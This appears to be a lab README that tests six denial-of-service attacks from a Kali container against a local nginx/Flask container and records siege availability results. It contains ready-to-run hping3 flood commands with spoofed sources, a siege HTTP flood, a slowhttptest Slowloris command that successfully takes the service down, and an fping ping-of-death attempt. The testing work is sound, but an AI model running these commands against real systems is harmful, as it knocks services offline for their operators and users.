# Tasks
* create attacker Kali linux container (using UDP Flood, ICMP flood, HTTP flood, Slowloris, SYN flood,  Ping of Death attacks)
* create defender container
* measure attacker vs non-defended container and attacker vs properly defended container

# Additional resource
* https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/

# App
Is a simple nginx ([image link](https://hub.docker.com/_/nginx)) which proxies request to Flask app that returns 200 "Ok".

# Kali Linux

Used `kalilinux/kali-rolling` see [link](https://www.kali.org/docs/containers/using-kali-docker-images/)

## Udp flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 --flood --rand-source --udp -p 8080 nginx
```

## ICMP flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 --flood --rand-source -1 -p 8080 nginx
```

## HTTP flood
used [siege](https://www.kali.org/tools/siege/)
```
    $ siege -b -c250 -t60s http://nginx:8080
```

## Slowloris attack
used Kali package [slowhttptest](https://www.kali.org/tools/slowhttptest/)
```
    $ slowhttptest -c 1050 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://nginx:8080 -x 24 -p 3
```

## Syn flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 -S --flood -V -p 8080 nginx
```


## Ping of death
used [fping](https://www.kali.org/tools/fping/)
```
    $ fping -b 65510 nginx
```

# Results

Following command used to determine health of our application
```
    $ siege -d1 -c200 -t120s http://localhost:8080
```
Example normal report
```
Transactions:		       23191 hits
Availability:		      100.00 %
Elapsed time:		      119.27 secs
Data transferred:	        0.04 MB
Response time:		        1.02 secs
Transaction rate:	      194.44 trans/sec
Throughput:		        0.00 MB/sec
Concurrency:		      198.96
Successful transactions:       23191
Failed transactions:	           0
Longest transaction:	        1.81
Shortest transaction:	        0.09
```

Also we'll monitor docker stats using [TIG stack](https://hackmd.io/@lnu-iot/tig-stack)

## standart nginx config without additional defence

* udp flood

This attack doesn't seem to affect our application (possibly because we're not listening to udp ports :D ).
The only thing we can track is increased amount of incomming traffic to nginx container:
![Screenshot from 2022-01-03 18-21-29](https://user-images.githubusercontent.com/19594637/147954476-4faface4-860d-4d0e-b1b2-3bcc42e3a565.png)


* icmp flood

This attack doesn't seem to work on nginx:1.21. Since our `siege` command reports normal results:
```
Transactions:		       65207 hits
Availability:		      100.00 %
Elapsed time:		      119.72 secs
Data transferred:	        0.12 MB
Response time:		        0.37 secs
Transaction rate:	      544.66 trans/sec
Throughput:		        0.00 MB/sec
Concurrency:		      199.47
Successful transactions:       65207
Failed transactions:	           0
Longest transaction:	        1.40
Shortest transaction:	        0.01
```
We can only observe increase traffic on nginx container:
![Screenshot from 2022-01-03 18-35-30](https://user-images.githubusercontent.com/19594637/147955909-0c201d5c-0cc0-4139-986a-9d0f87fbc552.png)


* http flood

Using one kali linux container the only thing I could achieve is to siginficantly increase response times of the application:
```
Transactions:		       16393 hits
Availability:		      100.00 %
Elapsed time:		      119.19 secs
Data transferred:	        0.03 MB
Response time:		        1.45 secs
Transaction rate:	      137.54 trans/sec
Throughput:		        0.00 MB/sec
Concurrency:		      198.89
Successful transactions:       16393
Failed transactions:	           0
Longest transaction:	        3.50
Shortest transaction:	        0.01
```
Also we can observe increase CPU and traffic on our nginx container:
![Screenshot from 2022-01-03 18-58-40](https://user-images.githubusercontent.com/19594637/147958096-40632afc-3a05-4c6c-bd23-6d0bdfe4923e.png)


* slowloris attack

Once we've reached 1022 connection we'll successfuly DOSed our service
```
slow HTTP test status on 35th second:

initializing:        0
pending:             0
connected:           1022
error:               0
closed:              28
service available:   NO
```
And our siege command results show us that our application was unable to server requests
```
siege aborted due to excessive socket failure; you
can change the failure threshold in $HOME/.siegerc

Transactions:		        2195 hits
Availability:		       64.54 %
Elapsed time:		        9.96 secs
Data transferred:	        0.00 MB
Response time:		        0.81 secs
Transaction rate:	      220.38 trans/sec
Throughput:		        0.00 MB/sec
Concurrency:		      178.48
Successful transactions:        2195
Failed transactions:	        1206
Longest transaction:	        1.50
```
What is really dangerous about this kind of attack is that it does not seems to be easy to track using metrics (the only spike for nginx container is RAM)
![Screenshot from 2022-01-03 18-11-12](https://user-images.githubusercontent.com/19594637/147953506-abca9fc6-685f-4faf-9e31-4055c1146df2.png)

* syn flood

Doesn't seem to bother our application availability:
```
Lifting the server siege...
Transactions:		       98327 hits
Availability:		      100.00 %
Elapsed time:		      179.49 secs
Data transferred:	        0.19 MB
Response time:		        0.36 secs
Transaction rate:	      547.81 trans/sec
Throughput:		        0.00 MB/sec
Concurrency:		      199.59
Successful transactions:       98327
Failed transactions:	           0
Longest transaction:	        3.20
Shortest transaction:	        0.00

```
![Screenshot from 2022-01-04 13-53-13](https://user-images.githubusercontent.com/19594637/148055345-17b2e7a6-76ce-4b5a-911d-7f21816a8fa5.png)

* Ping of death

Does not seems to be reproducable with modern software
```
fping: data size 65510 not valid, must be lower than 65488
```
